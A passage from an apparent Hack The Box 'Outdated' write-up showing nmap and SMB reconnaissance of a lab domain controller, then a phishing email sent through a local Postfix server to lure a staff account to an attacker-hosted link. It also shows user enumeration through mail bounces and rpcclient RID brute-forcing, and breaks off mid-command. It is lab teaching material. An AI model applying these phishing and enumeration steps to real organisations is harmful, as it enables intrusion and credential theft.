font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Subject</span> Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED</span>
<span id="cb1-47"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Not</span> valid before: 2022-06-18T05:50:24</span>
<span id="cb1-48"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_Not</span> valid after:  2024-06-18T06:00:24</span>
<span id="cb1-49"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_ssl-date:</span> 2022-08-15T14:52:47+00:00<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+7h00m01s</span> from scanner time.</span>
<span id="cb1-50"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">3268/tcp</span>  open  ldap          Microsoft Windows Active Directory LDAP <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Domain:</span> outdated.htb0., Site: Default-First-Site-Name<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-51"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_ssl-date:</span> 2022-08-15T14:52:47+00:00<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+7h00m01s</span> from scanner time.</span>
<span id="cb1-52"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ssl-cert:</span> Subject: </span>
<span id="cb1-53"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Subject</span> Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED</span>
<span id="cb1-54"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Not</span> valid before: 2022-06-18T05:50:24</span>
<span id="cb1-55"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_Not</span> valid after:  2024-06-18T06:00:24</span>
<span id="cb1-56"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">3269/tcp</span>  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Domain:</span> outdated.htb0., Site: Default-First-Site-Name<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-57"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_ssl-date:</span> 2022-08-15T14:52:47+00:00<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+7h00m01s</span> from scanner time.</span>
<span id="cb1-58"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ssl-cert:</span> Subject: </span>
<span id="cb1-59"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Subject</span> Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED</span>
<span id="cb1-60"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Not</span> valid before: 2022-06-18T05:50:24</span>
<span id="cb1-61"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_Not</span> valid after:  2024-06-18T06:00:24</span>
<span id="cb1-62"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">5985/tcp</span>  open  http          Microsoft HTTPAPI httpd 2.0 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SSDP/UPnP</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-63"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-server-header:</span> Microsoft-HTTPAPI/2.0</span>
<span id="cb1-64"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-title:</span> Not Found</span>
<span id="cb1-65"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">8530/tcp</span>  open  http          Microsoft IIS httpd 10.0</span>
<span id="cb1-66"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-server-header:</span> Microsoft-IIS/10.0</span>
<span id="cb1-67"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-title:</span> Site doesnt have a title.</span>
<span id="cb1-68"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">http-methods:</span> </span>
<span id="cb1-69"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span>  Potentially risky methods: TRACE</span>
<span id="cb1-70"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">8531/tcp</span>  open  unknown</span>
<span id="cb1-71"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">9389/tcp</span>  open  mc-nmf        .NET Message Framing</span>
<span id="cb1-72"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49667/tcp</span> open  msrpc         Microsoft Windows RPC</span>
<span id="cb1-73"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49669/tcp</span> open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span>
<span id="cb1-74"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49670/tcp</span> open  msrpc         Microsoft Windows RPC</span>
<span id="cb1-75"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49672/tcp</span> open  msrpc         Microsoft Windows RPC</span>
<span id="cb1-76"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49884/tcp</span> open  msrpc         Microsoft Windows RPC</span>
<span id="cb1-77"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49903/tcp</span> open  msrpc         Microsoft Windows RPC</span>
<span id="cb1-78"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49917/tcp</span> open  msrpc         Microsoft Windows RPC</span>
<span id="cb1-79"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Service</span> Info: Hosts: mail.outdated.htb, DC<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">OS:</span> Windows<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">CPE:</span> cpe:/o:microsoft:windows</span>
<span id="cb1-80"></span>
<span id="cb1-81"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Host</span> script results:</span>
<span id="cb1-82"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_clock-skew:</span> mean: 7h00m00s, deviation: 0s, median: 7h00m00s</span>
<span id="cb1-83"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">smb2-security-mode:</span> </span>
<span id="cb1-84"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">3.1.1:</span> </span>
<span id="cb1-85"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span>    Message signing enabled and required</span>
<span id="cb1-86"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">smb2-time:</span> </span>
<span id="cb1-87"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">date:</span> 2022-08-15T14:52:10</span>
<span id="cb1-88"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span>  start_date: N/A</span>
<span id="cb1-89"></span>
<span id="cb1-90"></span>
<span id="cb1-91"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  outdated sudo nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-sU</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--top-port</span> 100 10.10.11.175 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--open</span></span>
<span id="cb1-92"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>    STATE SERVICE</span>
<span id="cb1-93"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">123/udp</span> open  ntp</span></code></pre></div>
<div class="sourceCode" id="cb2" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb2-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  outdated smbclient <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-L</span> 10.10.11.175</span>
<span id="cb2-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Password</span> for <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">WORKGROUP</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\v</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">oid</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span>:</span>
<span id="cb2-3"></span>
<span id="cb2-4">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Sharename</span>       Type      Comment</span>
<span id="cb2-5">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">---------</span>       <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">----</span>      <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-------</span></span>
<span id="cb2-6">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ADMIN$</span>          Disk      Remote Admin</span>
<span id="cb2-7">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">C$</span>              Disk      Default share</span>
<span id="cb2-8">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">IPC$</span>            IPC       Remote IPC</span>
<span id="cb2-9">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">NETLOGON</span>        Disk      Logon server share </span>
<span id="cb2-10">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Shares</span>          Disk      </span>
<span id="cb2-11">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SYSVOL</span>          Disk      Logon server share </span>
<span id="cb2-12">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">UpdateServicesPackages</span> Disk      A network share to be used by client systems for collecting all software packages <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">usually</span> applications<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">published</span> on this WSUS system.</span>
<span id="cb2-13">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">WsusContent</span>     Disk      A network share to be used by Local Publishing to place published content on this WSUS system.</span>
<span id="cb2-14">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">WSUSTemp</span>        Disk      A network share used by Local Publishing from a Remote WSUS Console Instance.</span>
<span id="cb2-15"></span>
<span id="cb2-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  outdated smbclient //10.10.11.175/Shares</span>
<span id="cb2-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Password</span> for <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">WORKGROUP</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\v</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">oid</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span>:</span>
<span id="cb2-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">smb:</span> <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\&gt;</span> ls</span>
<span id="cb2-19">  <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">.</span>                                   D        0  Mon Jun 20 17:01:33 2022</span>
<span id="cb2-20">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">..</span>                                  D        0  Mon Jun 20 17:01:33 2022</span>
<span id="cb2-21">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">NOC_Reminder.pdf</span>                   AR   106977  Mon Jun 20 17:00:32 2022</span>
<span id="cb2-22"></span>
<span id="cb2-23">        <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">9116415</span> blocks of size 4096. 1369832 blocks available</span>
<span id="cb2-24"></span>
<span id="cb2-25"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">smb:</span> <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\&gt;</span> get NOC_Reminder.pdf</span>
<span id="cb2-26"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">getting</span> file <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\N</span>OC_Reminder.pdf of size 106977 as NOC_Reminder.pdf <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">614.5</span> KiloBytes/sec<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">average</span> 614.5 KiloBytes/sec<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span></code></pre></div>
<p>In the PDF we find information about a recent breach, where users are asked to mail information to <code>itsupport@outdated.htb</code> - this might be a good entrypoint for us using phising if we’re able to compromize the SMTP server or setup our own SMTP server.</p>
<p><img src="https://exploit.se/posts/2022-08-22-htb-writeup-outdated/images/outdated01.png" class="img-fluid"></p>
<p>Lets start by trying to setup a local SMTP server and mail a phishing/test link to <code>itsupport</code>. Before sending the email, make sure to start a local HTTP server to capture the request if itsupport clicks the link.</p>
<div class="sourceCode" id="cb3" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb3-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  outdated apt install mailutils postfix</span>
<span id="cb3-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  outdated sudo postconf <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-e</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"mydestination = </span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$myhostname</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">, void, localhost.localdomain, localhost"</span></span>
<span id="cb3-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  outdated sudo postconf <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-e</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"mynetworks = 127.0.0.0/8, 10.10.14.0/24"</span></span>
<span id="cb3-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  outdated sudo postconf <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-e</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"inet_interfaces = all"</span></span>
<span id="cb3-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  outdated sudo postconf <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-e</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"inet_protocols = ipv4"</span></span>
<span id="cb3-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  outdated sudo postconf <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-e</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"recipient_delimiter = +"</span></span>
<span id="cb3-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  outdated sudo postconf <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-e</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"lmtp_host_lookup = native"</span></span>
<span id="cb3-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  outdated sudo postconf <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-e</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"smtp_host_lookup = native"</span></span>
<span id="cb3-9"></span>
<span id="cb3-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  outdated service postfix restart</span>
<span id="cb3-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  outdated telnet localhost 25</span>
<span id="cb3-12"></span>
<span id="cb3-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">220</span> void.xxxxx.se ESMTP Postfix <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Debian/GNU</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb3-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ehlo</span> localhost</span>
<span id="cb3-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">250-void.xxxxx.se</span></span>
<span id="cb3-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">250-PIPELINING</span></span>
<span id="cb3-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">250-SIZE</span> 10240000</span>
<span id="cb3-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">250-VRFY</span></span>
<span id="cb3-19"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">250-ETRN</span></span>
<span id="cb3-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">250-STARTTLS</span></span>
<span id="cb3-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">250-ENHANCEDSTATUSCODES</span></span>
<span id="cb3-22"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">250-8BITMIME</span></span>
<span id="cb3-23"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">250-DSN</span></span>
<span id="cb3-24"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">250-SMTPUTF8</span></span>
<span id="cb3-25"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">250</span> CHUNKING</span>
<span id="cb3-26"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">mail</span> from: void@void</span>
<span id="cb3-27"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">250</span> 2.1.0 Ok</span>
<span id="cb3-28"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">rcpt</span> to: itsupport@outdated.htb</span>
<span id="cb3-29"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">250</span> 2.1.5 Ok</span>
<span id="cb3-30"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">data</span></span>
<span id="cb3-31"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">354</span> End data with <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>CR<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;&lt;</span>LF<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>.<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>CR<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;&lt;</span>LF<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb3-32"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Subject:</span> Phishing</span>
<span id="cb3-33"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">http://10.10.14.6:8080</span></span>
<span id="cb3-34"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">.</span></span>
<span id="cb3-35"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">250</span> 2.0.0 Ok: queued as 0C51812101C</span>
<span id="cb3-36"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">quit</span></span>
<span id="cb3-37"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">221</span> 2.0.0 Bye</span></code></pre></div>
<p>Verify that the mail has been sent by looking at <code>/var/log/mail.log</code> and verify that it has <strong>status = sent</strong>.</p>
<div class="sourceCode" id="cb4" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb4-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  outdated cat /var/log/mail.log</span>
<span id="cb4-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb4-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Aug</span> 15 10:51:28 void postfix/smtp<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">7917</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span>: 0C51812101C: to=<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>itsupport@outdated.htb<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>, relay=outdated.htb<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">10.10.11.175</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span>:25, delay=54, delays=43/0.01/0.08/11, dsn=2.0.0, status=sent <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">250</span> Queued <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">10.432</span> seconds<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">))</span></span></code></pre></div>
<p>Although the mail is sent and nothing seems to be out of the ordinary, we don’t get anything back. Testing other transmitters we see that the mail bounces due to <code>500: Unknown user</code>, if we had a list of potential users we could verify them this way.</p>
<div class="sourceCode" id="cb5" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb5-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Aug</span> 15 10:58:37 void postfix/smtp<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">8307</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span>: 7EEB6121020: to=<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>0xpthree@outdated.htb<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>, relay=outdated.htb<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">10.10.11.175</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span>:25, delay=0.16, delays=0/0/0.09/0.07, dsn=5.0.0, status=bounced <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">host</span> outdated.htb<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">10.10.11.175</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> said: 550 Unknown user <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(in</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">reply</span> to RCPT TO command<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">))</span></span>
<span id="cb5-2"></span>
<span id="cb5-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Aug</span> 15 11:00:20 void postfix/smtp<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">8325</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span>: 90736121020: to=<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>Administrator@outdated.htb<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>, relay=outdated.htb<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">10.10.11.175</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span>:25, delay=0.15, delays=0/0/0.08/0.06, dsn=5.0.0, status=bounced <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">host</span> outdated.htb<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">10.10.11.175</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> said: 550 Unknown user <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(in</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">reply</span> to RCPT TO command<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">))</span></span></code></pre></div>
</section>
<section id="step-2" class="level3">
<h3 class="anchored" data-anchor-id="step-2">Step 2</h3>
<p>At this point we have pretty much nothing, and since we don’t get any callbacks from SMTP it’s starting to feel like a rabbithole..<br>
We can continue enumerating further to see if I missed something, we can use <code>rpcclient</code> to enumerate all users in the machine.</p>
<div class="sourceCode" id="cb6" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb6-1"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## Find SID</span></span>
<span id="cb6-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  outdated rpcclient <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-U</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">""</span> 10.10.11.175    </span>
<span id="cb6-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Password</span> for [WORKGROUP<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\]</span>:</span>
<span id="cb6-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">rpcclient</span> $<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> lookupnames Administrator</span>
<span id="cb6-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Administrator</span> S-1-5-21-4089647348-67660539-4016542185-500 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">User:</span> 1<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb6-6"></span>
<span id="cb6-7"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## Bruteforce to find all users</span></span>
<span id="cb6-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  outdated for i in <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">{</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">1000</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">..</span><span class="dv" style="color: #AD0000;
background-color: null;
